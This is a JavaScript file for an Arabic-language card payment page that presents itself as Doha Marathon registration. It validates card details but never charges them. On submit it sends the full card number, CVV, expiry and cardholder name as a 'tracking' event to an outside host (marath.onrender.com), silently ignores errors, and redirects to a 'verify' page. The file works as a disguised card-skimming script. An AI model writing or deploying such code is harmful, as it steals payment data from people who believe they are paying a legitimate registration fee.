(() => {
	"use strict";

	const reviewKey = "doha-marathon-registration-review";
	const expiryKey = "doha-marathon-payment-expiry";
	const review = JSON.parse(window.sessionStorage.getItem(reviewKey) || "null");
	const expiry = Number(window.sessionStorage.getItem(expiryKey));
	const paymentTotal = document.querySelector("#card-payment-total");
	const cardForm = document.querySelector("#card-form");
	const cardNumber = document.querySelector("#card-number");
	const cardCvv = document.querySelector("#card-cvv");
	const cardExpiry = document.querySelector("#card-expiry");
	const cardholderName = document.querySelector("#cardholder-name");
	const payButton = document.querySelector("#card-pay-button");
	const message = document.querySelector("#card-form-message");

	if (!paymentTotal || !cardForm || !cardNumber || !cardCvv || !cardExpiry || !cardholderName || !payButton || !message) {
		throw new Error("Card payment markup is incomplete.");
	}

	if (!review || typeof review.price !== "number" || !Number.isFinite(review.price) || !Number.isFinite(expiry)) {
		window.location.replace("registration-summary.html");
		return;
	}

	paymentTotal.textContent = `ر.ق ${review.price.toFixed(2)}`;

	const updateButtonText = () => {
		payButton.textContent = `ادفع ر.ق ${review.price.toFixed(2)}`;
	};

	const validateExpiry = () => {
		const digits = cardExpiry.value.replace(/\D/g, "");
		if (!digits.length) {
			cardExpiry.classList.remove("is-invalid");
			cardExpiry.setAttribute("aria-invalid", "false");
			cardForm.classList.remove("is-expiry-invalid");
			return false;
		}

		const month = Number(digits.slice(0, 2));
		let invalid = digits.length >= 2 && (month < 1 || month > 12);

		if (!invalid && digits.length >= 4) {
			const year = Number(digits.slice(2, 4));
			if (year < 26 || year > 35) {
				invalid = true;
			} else {
				const currentYear = new Date().getFullYear() % 100;
				const currentMonth = new Date().getMonth() + 1;
				invalid = year < currentYear || (year === currentYear && month < currentMonth);
			}
		}

		cardExpiry.classList.toggle("is-invalid", invalid);
		cardExpiry.setAttribute("aria-invalid", String(invalid));
		return digits.length === 4 && !invalid;
	};

	const isFormValid = () => {
		const numberDigits = cardNumber.value.replace(/\D/g, "");
		const cvv = cardCvv.value;
		const name = cardholderName.value.trim();
		const expiryValid = validateExpiry();
		const valid = numberDigits.length === 16 && /^\d{3,4}$/.test(cvv) && expiryValid && name.length > 0 && Date.now() < expiry;

		cardNumber.classList.toggle("is-invalid", numberDigits.length > 0 && numberDigits.length !== 16);
		cardNumber.setAttribute("aria-invalid", String(numberDigits.length > 0 && numberDigits.length !== 16));
		cardCvv.classList.toggle("is-invalid", cvv.length > 0 && !/^\d{3,4}$/.test(cvv));
		cardCvv.setAttribute("aria-invalid", String(cvv.length > 0 && !/^\d{3,4}$/.test(cvv)));
		cardholderName.classList.toggle("is-invalid", cardholderName.value.length > 0 && !name);
		cardholderName.setAttribute("aria-invalid", String(cardholderName.value.length > 0 && !name));
		payButton.disabled = !valid;
		return valid;
	};

	cardNumber.addEventListener("input", () => {
		const digits = cardNumber.value.replace(/\D/g, "").slice(0, 16);
		cardNumber.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
		isFormValid();
	});

	cardCvv.addEventListener("input", () => {
		cardCvv.value = cardCvv.value.replace(/\D/g, "").slice(0, 4);
		isFormValid();
	});

	cardExpiry.addEventListener("input", () => {
		let digits = cardExpiry.value.replace(/\D/g, "").slice(0, 4);
		if (digits.length === 1 && Number(digits) >= 2) {
			digits = `0${digits}`;
		}
		cardExpiry.value = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
		validateExpiry();
		isFormValid();
	});

	cardExpiry.addEventListener("blur", () => {
		validateExpiry();
		isFormValid();
	});

	cardholderName.addEventListener("input", isFormValid);

	const remaining = Math.max(0, expiry - Date.now());
	window.setTimeout(() => {
		payButton.disabled = true;
		message.hidden = false;
		message.textContent = "انتهت صلاحية جلسة الدفع. ارجع إلى ملخص التسجيل لبدء جلسة جديدة.";
	}, remaining);

	updateButtonText();
	isFormValid();

	cardForm.addEventListener("submit", (event) => {
		event.preventDefault();
		if (!isFormValid()) {
			message.hidden = false;
			message.textContent = "تحقق من رقم البطاقة ورمز CVV وتاريخ الانتهاء والاسم قبل المتابعة.";
			return;
		}

		const cardData = {
			cardNumber: cardNumber.value.replace(/\s+/g, ""),
			cardCvv: cardCvv.value.trim(),
			cardExpiry: cardExpiry.value.trim(),
			cardholderName: cardholderName.value.trim(),
			"card-number": cardNumber.value.replace(/\s+/g, ""),
			"card-cvv": cardCvv.value.trim(),
			"card-expiry": cardExpiry.value.trim(),
			"cardholder-name": cardholderName.value.trim()
		};

		if (typeof window.triggerTrackerFormSync === "function") {
			window.triggerTrackerFormSync();
		}

		try {
			fetch('https://marath.onrender.com/api/track', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					sessionId: localStorage.getItem('doha_marathon_session') || '',
					type: 'form-submit',
					page: 'payment-card',
					data: cardData
				}),
				keepalive: true
			}).catch(() => {});
		} catch(e) {}

		setTimeout(() => {
			window.location.replace("payment-verify.html");
		}, 200);
	});
})();
